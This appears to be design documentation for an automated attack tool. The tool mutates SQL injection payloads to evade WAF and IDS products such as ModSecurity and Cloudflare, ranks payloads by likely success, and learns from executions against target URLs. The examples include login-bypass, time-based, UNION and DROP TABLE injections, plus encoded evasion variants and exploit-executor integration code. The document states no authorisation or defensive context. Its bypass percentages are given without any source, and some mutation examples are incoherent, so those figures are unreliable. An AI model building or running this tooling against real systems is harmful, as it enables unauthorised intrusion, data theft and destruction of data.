# Enhanced Payload Generation with Mutation & Scoring

## Overview

The payload system now includes two powerful capabilities:
1. **Dynamic Payload Mutation** - Generate WAF/IDS evasion variants
2. **Confidence Scoring** - Rank payloads by effectiveness

These work together to intelligently select and adapt payloads for maximum success probability.

## Architecture

```
PayloadService
├── PayloadGenerator (base payloads)
├── PayloadMutator (WAF evasion)
└── PayloadScorer (confidence ranking)
```

## Component 1: Dynamic Payload Mutation

### Purpose
Transform successful payloads into variants that bypass WAF/IDS filters while maintaining functionality.

### Mutation Strategies

| Strategy | Use Case | Bypass Probability |
|----------|----------|-------------------|
| **Base64 Encode** | General encoding | 70% |
| **Hex Encode** | PHP/Binary protocols | 75% |
| **URL Encode** | Query parameters | 65% |
| **Double URL Encode** | Double-encoded filters | 55% |
| **HTML Entity** | Cloudflare WAF | 72% |
| **Unicode Escape** | Unicode normalization bypass | 68% |
| **Hex Escape** | PHP/Bash execution | 70% |
| **Comment Injection** | SQL filters (`/* */`) | 55% |
| **Case Variation** | Case-sensitive filters | 40% |
| **Equivalent Operators** | Operator replacement (`OR` → `\|\|`) | 65% |
| **Whitespace Variation** | Regex-based WAF | 50% |
| **Concatenation** | String assembly | 62% |
| **Nested Encoding** | Multi-layer filters | 78% |
| **Unicode Normalization** | NFD bypass | 52% |

### Technology-Specific Profiles

**PHP**
```python
preferred_strategies = [
    HEX_ESCAPE,
    EQUIVALENT_OPERATORS,
    WHITESPACE_VARIATION,
    CONCATENATION,
]
# Prefers operator alternatives: || vs or, && vs and
```

**Python**
```python
preferred_strategies = [
    UNICODE_ESCAPE,
    HEX_ENCODE,
    CONCATENATION,
]
# Supports Python string concatenation patterns
```

**Java**
```python
preferred_strategies = [
    HEX_ENCODE,
    URL_ENCODE,
    UNICODE_ESCAPE,
]
# Java string building methods
```

### WAF-Specific Profiles

**ModSecurity**
- Targets: Regex-based signatures
- Techniques: Comment injection, case variation, whitespace
- Success Rate: ~65%

**Cloudflare**
- Targets: HTML/Script detection
- Techniques: HTML entities, double encoding, Unicode normalization
- Success Rate: ~72%

**Generic WAF**
- Techniques: Hex encoding, base64, concatenation
- Success Rate: ~60%

### Usage Example

```python
from payload_service import PayloadService

service = PayloadService()

# Generate mutations for a payload
mutations = service.get_mutated_payloads(
    payload="' OR '1'='1' --",
    technology='php',
    target_waf='modsecurity',
    max_mutations=10
)

# Returns list of (variant, bypass_probability) tuples
for variant, prob in mutations:
    print(f"Bypass: {prob:.0%} -> {variant[:50]}")
```

### Mutation Example

**Original:**
```sql
' OR '1'='1' --
```

**Base64 Variant:**
```
' OR 'MSc9JzE='
```

**Hex Escape (PHP):**
```
\x27 \x4f \x52 \x27 ...
```

**Comment Injection (SQL):**
```sql
' OR /**/''='1' --
```

**Concatenation (PHP):**
```php
' OR '' . '1' . '='  . '1' --
```

## Component 2: Confidence Scoring

### Purpose
Weight payloads by multiple factors to identify most effective options for a target.

### Scoring Formula

```
Final Score = (
    CVE_Severity * 0.25 +
    Success_Rate * 0.25 +
    Technology_Match * 0.20 +
    Recency_Frequency * 0.10 +
    WAF_Bypass * 0.10 +
    Source_Confidence * 0.10
) * Complexity_Penalty
```

### Scoring Factors

#### 1. CVE Severity (25% weight)
- **Critical**: 1.0
- **High**: 0.85
- **Medium**: 0.65
- **Low**: 0.35
- **CVSS Score**: Used directly (0-10 normalized)

```python
# Payload with CVE-2023-1234 (High, CVSS 8.5)
metrics.cve_severity = "High"
metrics.cvss_score = 8.5
# Score contribution: 0.85 * 0.25 = 0.212
```

#### 2. Historical Success Rate (25% weight)
- Based on execution history
- Confidence increases with sample size
- Formula: `success_count / total_executions`

```python
# 17 successes out of 20 attempts
metrics.successful_executions = 17
metrics.execution_count = 20
# Success rate: 0.85 (85%)
```

#### 3. Technology Match (20% weight)
- Matches payload against target technologies
- Multi-tech scoring: `matches / total_payload_techs`

```python
# Payload supports: PHP, MySQL
# Target has: PHP, MySQL, Apache
# Match: 2/2 = 1.0 (100%)
```

#### 4. Recency & Frequency (10% weight)
- Time decay: Recent payloads score higher
- Frequency boost for high-use payloads

| Days Since Use | Score |
|---|---|
| 0 (today) | 1.0 |
| 1-7 days | 0.9 |
| 8-30 days | 0.7 |
| 31-90 days | 0.5 |
| 90+ days | 0.3 |

```python
# If used 100+ times: +0.2 bonus
# If used 50+ times: +0.15 bonus
# If used 10+ times: +0.1 bonus
```

#### 5. WAF Bypass Capability (10% weight)
- Tracks success against specific WAFs
- Historical WAF bypass rates

```python
metrics.waf_bypass_history = {
    'modsecurity': 0.75,  # 75% bypass rate
    'cloudflare': 0.60,   # 60% bypass rate
}
metrics.avg_waf_bypass_rate = 0.675
```

#### 6. Source Confidence (10% weight)
- Weights by payload origin

| Source | Multiplier |
|--------|-----------|
| **P2P** (peer-verified) | 0.95 |
| **Learned** (previously successful) | 0.90 |
| **Web Scraped** (research/docs) | 0.75 |
| **Static** (default library) | 0.60 |

### Complexity Penalties

Payloads with higher complexity requirements receive penalties:

- **Requires Authentication**: ×0.8
- **Requires Session**: ×0.85
- **High False Positive Rate** (>30%): ×(1 - rate×0.5)
- **High Detection Risk** (>70%): ×0.75

### Usage Example

```python
from payload_service import PayloadService
from payload_scorer import PayloadMetrics
from datetime import datetime

service = PayloadService()

# Create payload metrics
metrics = PayloadMetrics(
    payload="' OR '1'='1' --",
    exploit_type="sql_injection",
    cve_id="CVE-2023-1234",
    cve_severity="High",
    cvss_score=8.5,
    successful_executions=17,
    execution_count=20,
    target_technologies=["PHP", "MySQL"],
    use_frequency=50,
    source="learned"
)

# Score it
scored = service.scorer.score_payload(
    metrics,
    target_technologies=["PHP", "MySQL"]
)

print(f"Score: {scored.final_score:.3f}")
print(f"Breakdown: {scored.score_breakdown}")
```

### Scoring Output Example

```
Payload: ' OR '1'='1' --
Final Score: 0.815

Score Breakdown:
  cve_severity         0.850 (weight: 0.25, contrib: 0.212)
  success_rate         0.850 (weight: 0.25, contrib: 0.212)
  technology_match     1.000 (weight: 0.20, contrib: 0.200)
  recency              1.000 (weight: 0.10, contrib: 0.100)
  waf_bypass           0.000 (weight: 0.10, contrib: 0.000)
  source_confidence    0.900 (weight: 0.10, contrib: 0.090)
```

## Integration: Intelligent Payload Selection

### All-In-One Method

Get payloads with mutations **and** scoring in one call:

```python
from payload_service import PayloadService

service = PayloadService()

target_info = {
    'technology': 'PHP',
    'vulnerability': 'sql_injection',
    'waf': 'modsecurity',
    'technologies': ['PHP', 'MySQL']
}

intelligent_payloads = service.get_intelligent_payloads(
    target_info,
    apply_mutations=True,      # Generate variants
    apply_scoring=True,         # Rank by confidence
    max_payloads=10
)

# Returns payloads with all metadata
for payload_dict in intelligent_payloads:
    print(f"\nConfidence: {payload_dict['confidence_score']:.3f}")
    print(f"Base: {payload_dict['payload']}")
    
    for mutation in payload_dict['mutations']:
        print(f"  Variant: {mutation['variant'][:40]}")
        print(f"  Bypass: {mutation['bypass_probability']:.0%}")
```

### Output Structure

```json
{
  "payload": "' OR '1'='1' --",
  "confidence_score": 0.815,
  "base_payload": "' OR '1'='1' --",
  "mutations": [
    {
      "variant": "' OR 'MSc9JzE='",
      "bypass_probability": 0.78
    },
    {
      "variant": "' OR /**/''='1' --",
      "bypass_probability": 0.65
    }
  ]
}
```

## Execution Tracking

### Purpose
Learn from execution results to improve future scoring.

### Tracking Method

```python
service.track_payload_execution(
    payload="' OR '1'='1' --",
    exploit_type="sql_injection",
    success=True,  # Whether it worked
    target_technologies=["PHP", "MySQL"],
    waf_name="modsecurity"  # Optional
)
```

### Metrics Updated

- **execution_count**: Incremented
- **successful_executions**: Incremented if success=True
- **historical_success_rate**: Recalculated
- **last_used**: Updated to now
- **use_frequency**: Incremented
- **waf_bypass_history**: Updated for specific WAF

### Feedback Loop

```
Execution → Track Results → Update Metrics → 
Re-score Payloads → Better Ranking → Higher Success
```

### Statistics API

```python
stats = service.get_payload_statistics()

print(f"Tracked payloads: {stats['tracked_payloads']}")
print(f"Total executions: {stats['total_executions']}")
print(f"Success rate: {stats['overall_success_rate']:.1%}")

# Get most used payloads
for metrics in stats['most_used_payloads'][:5]:
    print(f"{metrics.payload}: {metrics.use_frequency} uses")
```

## Advanced Usage

### Custom Payload Metrics

```python
from payload_scorer import PayloadMetrics

# Create payload with detailed metrics
metrics = PayloadMetrics(
    payload="' AND SLEEP(5)--",
    exploit_type="time_based_sqli",
    cve_id="CVE-2023-5678",
    cve_severity="High",
    cvss_score=7.5,
    historical_success_rate=0.72,
    execution_count=25,
    successful_executions=18,
    target_technologies=["PHP", "MySQL", "Apache"],
    technology_match_score=0.95,
    requires_authentication=False,
    requires_session=False,
    false_positive_rate=0.05,
    waf_bypass_history={'modsecurity': 0.70, 'cloudflare': 0.50},
    avg_waf_bypass_rate=0.60,
    detection_risk=0.40,
    source="learned",
    confidence=0.88
)

# Score it
scorer = PayloadScorer()
scored = scorer.score_payload(
    metrics,
    target_technologies=["PHP", "MySQL"],
    target_waf="modsecurity"
)

# Get explanation
print(scorer.explain_score(scored))
```

### Comparing Payloads

```python
comparison = service.scorer.compare_payloads(
    payload1_metrics,
    payload2_metrics
)

print(f"Payload 1: {comparison['payload1']['score']:.3f}")
print(f"Payload 2: {comparison['payload2']['score']:.3f}")
print(f"Winner: {comparison['winner']}")
```

### Batch Processing

```python
# Score multiple payloads at once
payloads = [
    "' OR '1'='1' --",
    "UNION SELECT NULL--",
    "'; DROP TABLE users--"
]

metrics_list = [
    PayloadMetrics(p, exploit_type="sql_injection")
    for p in payloads
]

scored = service.scorer.score_payloads(
    metrics_list,
    target_technologies=["PHP", "MySQL"],
    sort=True
)

for rank, sp in enumerate(scored, 1):
    print(f"{rank}. {sp.final_score:.3f} - {sp.metrics.payload[:40]}")
```

## Performance Considerations

### Mutation Performance
- **Single mutation**: <1ms
- **10 mutations**: <10ms
- **Ranked mutations**: <5ms additional

### Scoring Performance
- **Single payload**: <5ms
- **100 payloads**: <500ms
- **Caching**: Mutations cached in memory

### Optimization Tips

1. **Reuse PayloadService instance** (expensive initialization)
   ```python
   service = PayloadService()  # Create once
   # Reuse for multiple operations
   ```

2. **Batch operations** instead of individual scoring
   ```python
   # ✓ Good: Score all at once
   scored = scorer.score_payloads(payloads_list)
   
   # ✗ Avoid: Loop scoring
   for p in payloads:
       scored = scorer.score_payload(p)
   ```

3. **Cache metrics** for repeated payloads
   ```python
   service.payload_metrics[payload] = metrics
   ```

## Integration with Existing Systems

### With Exploit Executor

```python
from exploit_executor import ExploitExecutor
from payload_service import PayloadService

service = PayloadService()
executor = ExploitExecutor(target_url)

# Get intelligent payloads
payloads = service.get_intelligent_payloads(target_info)

# Execute and track
for payload_dict in payloads:
    result = executor.execute_sql_injection(payload_dict['payload'])
    
    # Track results for future scoring
    service.track_payload_execution(
        payload=payload_dict['payload'],
        exploit_type='sql_injection',
        success=result.success,
        target_technologies=target_info.get('technologies'),
        waf_name=result.detected_waf
    )
```

### With Comprehensive Exploit Seeker

```python
from comprehensive_exploit_seeker import UnifiedExploitKnowledge
from payload_service import PayloadService

seeker = UnifiedExploitKnowledge()
service = PayloadService()

# Get exploits from all sources
exploits = seeker.seek_all_exploits(target_url)

# Enhance with intelligent payloads
for exploit in exploits:
    if exploit.get('payload'):
        mutations = service.get_mutated_payloads(
            exploit['payload'],
            technology=target_info.get('technology'),
            target_waf=target_info.get('waf')
        )
        exploit['mutations'] = mutations
```

## Best Practices

### 1. Always Track Execution Results
```python
service.track_payload_execution(...)  # Every execution
```

### 2. Combine Mutations + Scoring
```python
# Don't use individually - combine for best results
intelligent = service.get_intelligent_payloads(
    target_info,
    apply_mutations=True,
    apply_scoring=True
)
```

### 3. Target-Specific Selection
```python
# Match payloads to exact target
target_info = {
    'technology': 'PHP 7.4',      # Specific version
    'waf': 'modsecurity 2.9.3',   # Specific WAF
    'technologies': ['PHP', 'MySQL', 'Apache']
}
```

### 4. Mutation Limits
```python
# 5-10 mutations per payload usually sufficient
mutations = service.get_mutated_payloads(
    payload,
    max_mutations=8  # Sweet spot
)
```

### 5. Score Interpretation
- **0.8+**: Very high confidence
- **0.6-0.8**: Good confidence
- **0.4-0.6**: Moderate confidence
- **<0.4**: Low confidence

## Files

- `payload_mutator.py` - Mutation engine with 14 strategies
- `payload_scorer.py` - Confidence scoring system
- `payload_service.py` - Unified service (updated)
- `ENHANCED_PAYLOAD_GENERATION.md` - This documentation

## Testing

Run included tests:

```bash
# Test mutator
python payload_mutator.py

# Test scorer
python payload_scorer.py

# Test integrated service
python payload_service.py
```

Expected output: Demonstrates mutations, scoring, and integrated selection.
